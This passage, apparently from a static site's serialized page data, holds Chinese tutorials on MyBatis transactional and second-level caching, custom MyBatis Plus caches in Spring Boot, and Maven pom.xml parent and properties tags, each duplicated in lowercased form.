gettransactionalcache(cache).getobject(key);\n    }\n\n    public void putobject(cache cache, cachekey key, object value) {\n        gettransactionalcache(cache).putobject(key, value);\n    }\n\n    /**\n     * 提交时全部提交\n     */\n    public void commit() {\n        for (transactionalcache txcache : transactionalcaches.values()) {\n            txcache.commit();\n        }\n    }\n\n    /**\n     * 回滚时全部回滚\n     */\n    public void rollback() {\n        for (transactionalcache txcache : transactionalcaches.values()) {\n            txcache.rollback();\n        }\n    }\n\n    private transactionalcache gettransactionalcache(cache cache) {\n        transactionalcache txcache = transactionalcaches.get(cache);\n        if (txcache == null) {\n            txcache = new transactionalcache(cache);\n            transactionalcaches.put(cache, txcache);\n        }\n        return txcache;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\npublic class transactionalcache implements cache {\n\n    private cache delegate;\n    // commit 时要不要清缓存\n    private boolean clearoncommit;\n    // commit 时要添加的元素\n    private map<object, object> entriestoaddoncommit;\n    private set<object> entriesmissedincache;\n\n    public transactionalcache(cache delegate) {\n        // delegate = fifocache\n        this.delegate = delegate;\n        // 默认 commit 时不清缓存\n        this.clearoncommit = false;\n        this.entriestoaddoncommit = new hashmap<>();\n        this.entriesmissedincache = new hashset<>();\n    }\n\n    @override\n    public string getid() {\n        return delegate.getid();\n    }\n\n    @override\n    public int getsize() {\n        return delegate.getsize();\n    }\n\n    @override\n    public object getobject(object key) {\n        // key：cachekey 拼装后的哈希码\n        object object = delegate.getobject(key);\n        if (object == null) {\n            entriesmissedincache.add(key);\n        }\n        return clearoncommit ? null : object;\n    }\n\n    @override\n    public void putobject(object key, object object) {\n        entriestoaddoncommit.put(key, object);\n    }\n\n    @override\n    public object removeobject(object key) {\n        return null;\n    }\n\n    @override\n    public void clear() {\n        clearoncommit = true;\n        entriestoaddoncommit.clear();\n    }\n\n    public void commit() {\n        if (clearoncommit) {\n            delegate.clear();\n        }\n        flushpendingentries();\n        reset();\n    }\n\n    public void rollback() {\n        unlockmissedentries();\n        reset();\n    }\n\n    private void reset() {\n        clearoncommit = false;\n        entriestoaddoncommit.clear();\n        entriesmissedincache.clear();\n    }\n\n    /**\n     * 刷新数据到 mappedstatement#cache 中，也就是把数据填充到 mapper xml 级别下。\n     * flushpendingentries 方法把事务缓存下的数据，填充到 fifocache 中。\n     */\n    private void flushpendingentries() {\n        for (map.entry<object, object> entry : entriestoaddoncommit.entryset()) {\n            delegate.putobject(entry.getkey(), entry.getvalue());\n        }\n        for (object entry : entriesmissedincache) {\n            if (!entriestoaddoncommit.containskey(entry)) {\n                delegate.putobject(entry, null);\n            }\n        }\n    }\n\n    private void unlockmissedentries() {\n        for (object entry : entriesmissedincache) {\n            delegate.putobject(entry, null);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\n其实上面饶了一圈下来，最终操作的是 mappedstatement 维护的 cache 对象， mappedstatement 是被全局 configuration 在缓存的，所以查询结束不会清除 mappedstatement 对象和缓存信息，只有当触发 update，commit，rollback 等才会清除 mappedstatement 里维护的缓存信息',charsets:{cjk:!0}},{title:"MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存",frontmatter:{title:"MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/303/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/02.Mybatis/31.mybatis/303.MyBatis%20Plus+Spring%20Boot%20%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BC%93%E5%AD%98.html",relativePath:"01.框架/02.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存.md",key:"v-0e7babe4",path:"/mybatis/mybatis/303/",headers:[{level:2,title:"一级缓存",slug:"一级缓存",normalizedTitle:"一级缓存",charIndex:2},{level:2,title:"二级缓存",slug:"二级缓存",normalizedTitle:"二级缓存",charIndex:667},{level:2,title:"自定义缓存",slug:"自定义缓存",normalizedTitle:"自定义缓存",charIndex:1802}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"一级缓存 二级缓存 自定义缓存",content:'# 一级缓存\n\n首先需要在 application.yml 中进行配置\n\nmybatis-plus:\n  # 指定具体xml路径 全路径\n  mapper-locations: classpath*:/com/fengqianrun/mybatisplus/**/*Mapper.xml\n  # 设置实体路径位置\n  type-aliases-package: com.fengqianrun.mybatisplus.bean\n  configuration:\n    # 开启一级缓存,默认是开启的\n    local-cache-scope: SESSION\n  GlobalConfig:\n    # 关闭 banner 效果\n    banner: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n其次在查询方法上使用注解 @Transactional，@Transactional 代表就像一个 session，我们在这里面重复执行查询，就只会查询一次\n\n@Transactional\n@GetMapping("/testOne")\npublic UserBean testOne(){\n    UserBean userBean = cacheOneMapper.testOne();\n    userBean = null;\n    userBean = cacheOneMapper.testOne();\n    return userBean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 二级缓存\n\n首先，在 application.yml 配置文件中添加如下配置：\n\nmybatis-plus:\n  configuration:\n    # 开启二级缓存\n    cache-enabled: true\n\n\n1\n2\n3\n4\n\n\n必须实现要给对象进行 Serializable，例如：\n\n@Data\n@TableName("user")\npublic class UserBean implements Serializable {\n    // ...\n}\n\n\n1\n2\n3\n4\n5\n\n\n最后，需要在 Mapper 接口中使用 @CacheNamespace ，使用该注解可以方便地为每个 Mapper 接口定义独立的缓存空间，并指定不同的缓存实现和缓存策略，从而更好地控制缓存效果。\n\n@Mapper\n@CacheNamespace(eviction = FifoCache.class)\npublic interface CacheTwoMapper extends BaseMapper<UserBean> {\n    List<UserBean> testAll();\n    UserBean testOne();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n但如果 Mapper 接口有对应的 XML，则需要在 XML 描述 cache，使用注解 @CacheNamespace 就会失效，两个一起存在就会报错\n\n<mapper namespace="com.fengqianrun.mybatisplus.cache2.CacheTwoMapper">\n    <cache eviction="fifo"/>\n    <select id="testAll" resultType="com.fengqianrun.mybatisplus.bean.UserBean">\n        select * from user\n    </select>\n    <select id="testOne" resultType="com.fengqianrun.mybatisplus.bean.UserBean">\n        select * from user where id = 1\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n二级缓存默认情况下是使用 MyBatis 自带的 PerpetualCache 实现，可以通过配置文件中的属性来设置缓存实现类和其他参数。另外，在使用二级缓存时，\n需要注意避免数据并发更新导致脏数据的问题，可以通过设置缓存刷新时间等方式来解决这个问题。\n\n\n# 自定义缓存\n\n如果你是但应用程序的话，使用以上的配置方式没有问题，但如果你是分布式或微服务，那么就会造成数据不一致的问题，此时我们需要借助其他缓存，比如 Redis 来缓存我们的查询数据。自定义缓存也只是在二级缓存基础上的改造，所以规则和二级缓存一样。\n\n实现 org.apache.ibatis.cache.Cache 类\n\npublic class MyCache implements Cache {\n\n    /**\n     * id 会是 mapper 接口的名称\n     */\n    private final String id;\n\n    /**\n     * 可以替换为 Redis\n     */\n    private Map<Object, Object> cache = new ConcurrentHashMap<Object, Object>();\n\n    public MyCache(String id) {\n        this.id = id;\n    }\n\n    /**\n     * 缓存唯一标识\n     * @return\n     */\n    @Override\n    public String getId() {\n        return id;\n    }\n\n    /**\n     * 将键值对放入缓存中\n     * @param key\n     * @param value\n     */\n    @Override\n    public void putObject(Object key, Object value) {\n        System.out.println("添加-自定义缓存: "+key+"  "+value);\n        cache.put(key, value);\n    }\n\n    /**\n     * 从缓存中获取指定键的值\n     * @param key\n     */\n    @Override\n    public Object getObject(Object key) {\n        System.out.println("查询-自定义缓存: "+key);\n        return cache.get(key);\n    }\n\n    /**\n     * 从缓存中移除指定键的值\n     * @param key\n     */\n    @Override\n    public Object removeObject(Object key) {\n        return cache.remove(key);\n    }\n\n    /**\n     * 清空缓存\n     */\n    @Override\n    public void clear() {\n        cache.clear();\n    }\n\n    /**\n     * 获取缓存中键值对的数量\n     * @return\n     */\n    @Override\n    public int getSize() {\n        return cache.size();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\n具体的 mapper\n\n@Mapper\n@CacheNamespace(implementation = MyCache.class,eviction = FifoCache.class)\npublic interface CacheThreeMapper extends BaseMapper<UserBean> {\n\n    @Select("select * from user")\n    List<UserBean> testAll();\n\n    @Select("select * from user where id = 1")\n    UserBean testOne();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> 我们还可以在 mapper 接口上加 @CacheNamespaceRef 注解，当我们在一个 Mapper 接口中需要使用其他 Mapper 接口所定义的缓存时，可以通过 @CacheNamespaceRef 注解来实现。该注解用于指定另一个 Mapper 接口的 Class 对象，表示当前 Mapper 接口需要引用该接口所定义的缓存命名空间。@CacheNamespaceRef (XXXXXMapper.class)',normalizedContent:'# 一级缓存\n\n首先需要在 application.yml 中进行配置\n\nmybatis-plus:\n  # 指定具体xml路径 全路径\n  mapper-locations: classpath*:/com/fengqianrun/mybatisplus/**/*mapper.xml\n  # 设置实体路径位置\n  type-aliases-package: com.fengqianrun.mybatisplus.bean\n  configuration:\n    # 开启一级缓存,默认是开启的\n    local-cache-scope: session\n  globalconfig:\n    # 关闭 banner 效果\n    banner: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n其次在查询方法上使用注解 @transactional，@transactional 代表就像一个 session，我们在这里面重复执行查询，就只会查询一次\n\n@transactional\n@getmapping("/testone")\npublic userbean testone(){\n    userbean userbean = cacheonemapper.testone();\n    userbean = null;\n    userbean = cacheonemapper.testone();\n    return userbean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 二级缓存\n\n首先，在 application.yml 配置文件中添加如下配置：\n\nmybatis-plus:\n  configuration:\n    # 开启二级缓存\n    cache-enabled: true\n\n\n1\n2\n3\n4\n\n\n必须实现要给对象进行 serializable，例如：\n\n@data\n@tablename("user")\npublic class userbean implements serializable {\n    // ...\n}\n\n\n1\n2\n3\n4\n5\n\n\n最后，需要在 mapper 接口中使用 @cachenamespace ，使用该注解可以方便地为每个 mapper 接口定义独立的缓存空间，并指定不同的缓存实现和缓存策略，从而更好地控制缓存效果。\n\n@mapper\n@cachenamespace(eviction = fifocache.class)\npublic interface cachetwomapper extends basemapper<userbean> {\n    list<userbean> testall();\n    userbean testone();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n但如果 mapper 接口有对应的 xml，则需要在 xml 描述 cache，使用注解 @cachenamespace 就会失效，两个一起存在就会报错\n\n<mapper namespace="com.fengqianrun.mybatisplus.cache2.cachetwomapper">\n    <cache eviction="fifo"/>\n    <select id="testall" resulttype="com.fengqianrun.mybatisplus.bean.userbean">\n        select * from user\n    </select>\n    <select id="testone" resulttype="com.fengqianrun.mybatisplus.bean.userbean">\n        select * from user where id = 1\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n二级缓存默认情况下是使用 mybatis 自带的 perpetualcache 实现，可以通过配置文件中的属性来设置缓存实现类和其他参数。另外，在使用二级缓存时，\n需要注意避免数据并发更新导致脏数据的问题，可以通过设置缓存刷新时间等方式来解决这个问题。\n\n\n# 自定义缓存\n\n如果你是但应用程序的话，使用以上的配置方式没有问题，但如果你是分布式或微服务，那么就会造成数据不一致的问题，此时我们需要借助其他缓存，比如 redis 来缓存我们的查询数据。自定义缓存也只是在二级缓存基础上的改造，所以规则和二级缓存一样。\n\n实现 org.apache.ibatis.cache.cache 类\n\npublic class mycache implements cache {\n\n    /**\n     * id 会是 mapper 接口的名称\n     */\n    private final string id;\n\n    /**\n     * 可以替换为 redis\n     */\n    private map<object, object> cache = new concurrenthashmap<object, object>();\n\n    public mycache(string id) {\n        this.id = id;\n    }\n\n    /**\n     * 缓存唯一标识\n     * @return\n     */\n    @override\n    public string getid() {\n        return id;\n    }\n\n    /**\n     * 将键值对放入缓存中\n     * @param key\n     * @param value\n     */\n    @override\n    public void putobject(object key, object value) {\n        system.out.println("添加-自定义缓存: "+key+"  "+value);\n        cache.put(key, value);\n    }\n\n    /**\n     * 从缓存中获取指定键的值\n     * @param key\n     */\n    @override\n    public object getobject(object key) {\n        system.out.println("查询-自定义缓存: "+key);\n        return cache.get(key);\n    }\n\n    /**\n     * 从缓存中移除指定键的值\n     * @param key\n     */\n    @override\n    public object removeobject(object key) {\n        return cache.remove(key);\n    }\n\n    /**\n     * 清空缓存\n     */\n    @override\n    public void clear() {\n        cache.clear();\n    }\n\n    /**\n     * 获取缓存中键值对的数量\n     * @return\n     */\n    @override\n    public int getsize() {\n        return cache.size();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\n具体的 mapper\n\n@mapper\n@cachenamespace(implementation = mycache.class,eviction = fifocache.class)\npublic interface cachethreemapper extends basemapper<userbean> {\n\n    @select("select * from user")\n    list<userbean> testall();\n\n    @select("select * from user where id = 1")\n    userbean testone();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> 我们还可以在 mapper 接口上加 @cachenamespaceref 注解，当我们在一个 mapper 接口中需要使用其他 mapper 接口所定义的缓存时，可以通过 @cachenamespaceref 注解来实现。该注解用于指定另一个 mapper 接口的 class 对象，表示当前 mapper 接口需要引用该接口所定义的缓存命名空间。@cachenamespaceref (xxxxxmapper.class)',charsets:{cjk:!0}},{title:"pom 文件介绍及 parent、properties 标签详解",frontmatter:{title:"pom 文件介绍及 parent、properties 标签详解",date:"2023-06-25T09:22:36.000Z",permalink:"/maven/2300/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/03.maven/2300.pom%20%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D%E5%8F%8A%20parent%E3%80%81properties%20%E6%A0%87%E7%AD%BE%E8%AF%A6%E8%A7%A3.html",relativePath:"01.框架/03.maven/2300.pom 文件介绍及 parent、properties 标签详解.md",key:"v-5ad0f62c",path:"/maven/2300/",headers:[{level:2,title:"pom.xml 介绍",slug:"pom-xml-介绍",normalizedTitle:"pom.xml 介绍",charIndex:2},{level:2,title:"parent 标签详解",slug:"parent-标签详解",normalizedTitle:"parent 标签详解",charIndex:4061},{level:2,title:"properties 标签详解",slug:"properties-标签详解",normalizedTitle:"properties 标签详解",charIndex:4813}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"pom.xml 介绍 parent 标签详解 properties 标签详解",content:'# pom.xml 介绍\n\npom 作为项目对象模型。通过 xml 表示 maven 项目，使用 pom.xml 来实现。主要描述了项目：包括配置文件；开发者需要遵循的规则，缺陷管理系统，组织和 licenses，项目的 url，项目的依赖性，以及其他所有的项目相关因素。\n\npom 中的描述信息都是用 xml 标签的方式，其中包含双标签和单标签，最顶部用于描述 xml 得版本和编码，其次是以 project 开头得双标签并表示为一个项目，定义了该项目可用内容及规范。\n\n# 双标签\n<project></project>\n\n# 单标签\n<project/>\n\n\n1\n2\n3\n4\n5\n\n\n对于 pom 可用内容较多，一级标签有如下表所示，但常用的都会有对应的描述\n\n标签                       描述\nmodelVersion             当前模型使用的版本\nparent                   继承某个 pom，部分是不可继承的\ngroupId                  公司或组织着唯一标识，如 org.springframework.boot 第一段是域（org、com\n                         非盈利组织、商业组织），第二段是公司名称，第三段是应用名称\nartifactId               项目的唯一 ID\nversion                  项目所属的版本号\nname                     项目名称\ndescription              项目描述信息\nproperties               配置信息描述，更多的是描述依赖 jar 版本、项目版本等\ndependencies             所要依赖的 jar 都需要在这里描述\nbuild                    构建信息，包括插件，资源文件信息等\nprofiles                 作用于项目环境的切换（dev、test、produce）\npackaging                描述项目的类型，可选 pom、jar、war\nrepositories             用是用来配置 maven 项目的远程仓库，可以是私服（nexus）\nmodules                  用来配置子项目\ndependencyManagement     用来提供了一种管理依赖版本号的方式。通常会在项目的最顶层的父 POM 中看到该元素。使用 pom.xml 中的\n                         dependencyManagement 元素能让所有在子项目中引用一个依赖而不用显式的列出版本号\ndistributionManagement   用于分发构件到远程仓库；mvn install 会将项目生成的构件安装到本地 Maven 仓库，mvn deploy\n                         用来将项目生成的构件分发到远程 Maven 仓库。本地 Maven 仓库的构件只能供当前用户使用，在分发到远程\n                         Maven 仓库之后，所有能访问该仓库的用户都能使用你的构件。\npluginRepositories       配置 Maven 从什么地方下载插件\nscm                      集成了软件配置管理的，他可以支持我们常用 SVN、CVS 等\ndevelopers               配置开发者信息，例如：一个开发者可以有多个 roles，properties\nissueManagement          bug 跟踪管理系统，定义 defect tracking system 缺陷跟踪系统\nreporting                包含 site 生成阶段的一些元素，某些 maven plugin 可以生成 reports 并且在 reporting\n                         下配置\nurl                      开发团队的网站，无关紧要可选\nlicenses                 许可证信息配置\norganization             配置组织信息\nciManagement             ?\ncontributors             ?\ninceptionYear            ?\nmailingLists             ?\nprerequisites            ?\nreports                  ?\n\n以一个 spring boot 常规项目做为示例：\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n    \x3c!-- 继承spring-boot使用他的相关依赖 --\x3e\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.6.9</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n    \x3c!-- 组织，应用 --\x3e\n    <groupId>com.xxx.boot</groupId>\n    \x3c!-- 项目ID，一般都喜欢是名称 --\x3e\n    <artifactId>framework</artifactId>\n    \x3c!-- 版本 --\x3e\n    <version>0.0.1-SNAPSHOT</version>\n    \x3c!-- 项目名称 --\x3e\n    <name>newFramework</name>\n    <description>Demo project for Spring Boot</description>\n    \x3c!-- 配置描述 --\x3e\n    <properties>\n        \x3c!-- java版本，但这个实际没什么用，单做一种描述信息看 --\x3e\n        <java.version>17</java.version>\n        \x3c!-- 实际指定编译版本可以使用如下 --\x3e\n        <maven.complier.source>17</maven.complier.source>\n        <maven.complier.target>17</maven.complier.target>\n    </properties>\n    \n    \x3c!-- 依赖 --\x3e\n    <dependencies>\n        \x3c!-- 具体依赖 --\x3e\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    \x3c!-- 构建信息 --\x3e\n    <build>\n        \x3c!-- 插件 --\x3e\n        <plugins>\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# parent 标签详解\n\n<parent></parent> 标签用于继承父项目的各类依赖及其他配置信息，如版本，构建信息，配置描述等，具体范围包括：\n\n# 可以继承部分\ngroupId、version、description、url、inceptionYear、organization、licenses、developers、contributors、mailingLists、scm、issueManagement、ciManagement、properties、dependencyManagement、dependencies、repositories、pluginRepositories、build、reporting、profiles\n\n# 不可继承部分\nartifactId、name、prerequisites\n\n\n1\n2\n3\n4\n5\n\n\n一个 parent 里所包含全部内容有：\n\n<parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.6.9</version>\n    <relativePath/>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n<relativePath/> 元素，它可以单标签也可以是双标签 <relativePath>../my-parent</relativePath> 。它不是必需的，但可以用作 Maven 的指示符，然后先搜索该项目的父级的给定路径，然后再搜索本地和远程存储库，单标签为默认从当前 pom.xml 的父级目录查找。\n\n\n# properties 标签详解\n\n<properties></properties> 没有提供什么实质性的内容供我们使用，检查下来在里面最多可以在描述一个 <project></project> 标签可用，但作用并不是不大。实际作用更多在于描述我们依赖 jar 的版本等。\n\n<properties>\n    \x3c!-- java版本，但这个实际没什么用，单做一种描述信息看 --\x3e\n    <java.version>17</java.version>\n    \x3c!-- 实际指定编译版本可以使用如下 --\x3e\n    <maven.complier.source>17</maven.complier.source>\n    <maven.complier.target>17</maven.complier.target>\n    \x3c!-- 定义lombok版本 --\x3e\n    <lombok.version>1.18.24</lombok.version>\n    <project.version>0.0.1-SNAPSHOT</project.version>\n</properties>\n\x3c!-- 项目版本 --\x3e\n<version>${project.version}</version>\n\x3c!-- 依赖 --\x3e\n<dependencies>\n    <dependency>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n        <version>${lombok.version}</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# pom.xml 介绍\n\npom 作为项目对象模型。通过 xml 表示 maven 项目，使用 pom.xml 来实现。主要描述了项目：包括配置文件；开发者需要遵循的规则，缺陷管理系统，组织和 licenses，项目的 url，项目的依赖性，以及其他所有的项目相关因素。\n\npom 中的描述信息都是用 xml 标签的方式，其中包含双标签和单标签，最顶部用于描述 xml 得版本和编码，其次是以 project 开头得双标签并表示为一个项目，定义了该项目可用内容及规范。\n\n# 双标签\n<project></project>\n\n# 单标签\n<project/>\n\n\n1\n2\n3\n4\n5\n\n\n对于 pom 可用内容较多，一级标签有如下表所示，但常用的都会有对应的描述\n\n标签                       描述\nmodelversion             当前模型使用的版本\nparent                   继承某个 pom，部分是不可继承的\ngroupid                  公司或组织着唯一标识，如 org.springframework.boot 第一段是域（org、com\n                         非盈利组织、商业组织），第二段是公司名称，第三段是应用名称\nartifactid               项目的唯一 id\nversion                  项目所属的版本号\nname                     项目名称\ndescription              项目描述信息\nproperties               配置信息描述，更多的是描述依赖 jar 版本、项目版本等\ndependencies             所要依赖的 jar 都需要在这里描述\nbuild                    构建信息，包括插件，资源文件信息等\nprofiles                 作用于项目环境的切换（dev、test、produce）\npackaging                描述项目的类型，可选 pom、jar、war\nrepositories             用是用来配置 maven 项目的远程仓库，可以是私服（nexus）\nmodules                  用来配置子项目\ndependencymanagement     用来提供了一种管理依赖版本号的方式。通常会在项目的最顶层的父 pom 中看到该元素。使用 pom.xml 中的\n                         dependencymanagement 元素能让所有在子项目中引用一个依赖而不用显式的列出版本号\ndistributionmanagement   用于分发构件到远程仓库；mvn install 会将项目生成的构件安装到本地 maven 仓库，mvn deploy\n                         用来将项目生成的构件分发到远程 maven 仓库。本地 maven 仓库的构件只能供当前用户使用，在分发到远程\n                         maven 仓库之后，所有能访问该仓库的用户都能使用你的构件。\npluginrepositories       配置 maven 从什么地方下载插件\nscm                      集成了软件配置管理的，他可以支持我们常用 svn、cvs 等\ndevelopers               配置开发者信息，例如：一个开发者可以有多个 roles，properties\nissuemanagement          bug 跟踪管理系统，定义 defect tracking system 缺陷跟踪系统\nreporting                包含 site 生成阶段的一些元素，某些 maven plugin 可以生成 reports 并且在 reporting\n                         下配置\nurl                      开发团队的网站，无关紧要可选\nlicenses                 许可证信息配置\norganization             配置组织信息\ncimanagement             ?\ncontributors             ?\ninceptionyear            ?\nmailinglists             ?\nprerequisites            ?\nreports                  ?\n\n以一个 spring boot 常规项目做为示例：\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n    \x3c!-- 继承spring-boot使用他的相关依赖 --\x3e\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.6.9</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n    \x3c!-- 组织，应用 --\x3e\n    <groupid>com.xxx.boot</groupid>\n    \x3c!-- 项目id，一般都喜欢是名称 --\x3e\n    <artifactid>framework</artifactid>\n    \x3c!-- 版本 --\x3e\n    <version>0.0.1-snapshot</version>\n    \x3c!-- 项目名称 --\x3e\n    <name>newframework</name>\n    <description>demo project for spring boot</description>\n    \x3c!-- 配置描述 --\x3e\n    <properties>\n        \x3c!-- java版本，但这个实际没什么用，单做一种描述信息看 --\x3e\n        <java.version>17</java.version>\n        \x3c!-- 实际指定编译版本可以使用如下 --\x3e\n        <maven.complier.source>17</maven.complier.source>\n        <maven.complier.target>17</maven.complier.target>\n    </properties>\n    \n    \x3c!-- 依赖 --\x3e\n    <dependencies>\n        \x3c!-- 具体依赖 --\x3e\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-test</artifactid>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    \x3c!-- 构建信息 --\x3e\n    <build>\n        \x3c!-- 插件 --\x3e\n        <plugins>\n            <plugin>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-maven-plugin</artifactid>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# parent 标签详解\n\n<parent></parent> 标签用于继承父项目的各类依赖及其他配置信息，如版本，构建信息，配置描述等，具体范围包括：\n\n# 可以继承部分\ngroupid、version、description、url、inceptionyear、organization、licenses、developers、contributors、mailinglists、scm、issuemanagement、cimanagement、properties、dependencymanagement、dependencies、repositories、pluginrepositories、build、reporting、profiles\n\n# 不可继承部分\nartifactid、name、prerequisites\n\n\n1\n2\n3\n4\n5\n\n\n一个 parent 里所包含全部内容有：\n\n<parent>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <version>2.6.9</version>\n    <relativepath/>\n</parent>\n\n\n1\n2\n3\n4\n5\n6\n\n\n<relativepath/> 元素，它可以单标签也可以是双标签 <relativepath>../my-parent</relativepath> 。它不是必需的，但可以用作 maven 的指示符，然后先搜索该项目的父级的给定路径，然后再搜索本地和远程存储库，单标签为默认从当前 pom.xml 的父级目录查找。\n\n\n# properties 标签详解\n\n<properties></properties> 没有提供什么实质性的内容供我们使用，检查下来在里面最多可以在描述一个 <project></project> 标签可用，但作用并不是不大。实际作用更多在于描述我们依赖 jar 的版本等。\n\n<properties>\n    \x3c!-- java版本，但这个实际没什么用，单做一种描述信息看 --\x3e\n    <java.version>17</java.version>\n    \x3c!-- 实际指定编译版本可以使用如下 --\x3e\n    <maven.complier.source>17</maven.complier.source>\n    <maven.complier.target>17</maven.complier.target>\n    \x3c!-- 定义lombok版本 --\x3e\n    <lombok.version>1.18.24</lombok.version>\n    <project.version>0.0.1-snapshot</project.version>\n</properties>\n\x3c!-- 项目版本 --\x3e\n<version>${project.version}</version>\n\x3c!-- 依赖 --\x3e\n<dependencies>\n    <dependency>\n        <groupid>org.projectlombok</groupid>\n        <artifactid>lombok</artifactid>\n        <version>${lombok.version}</version>\n    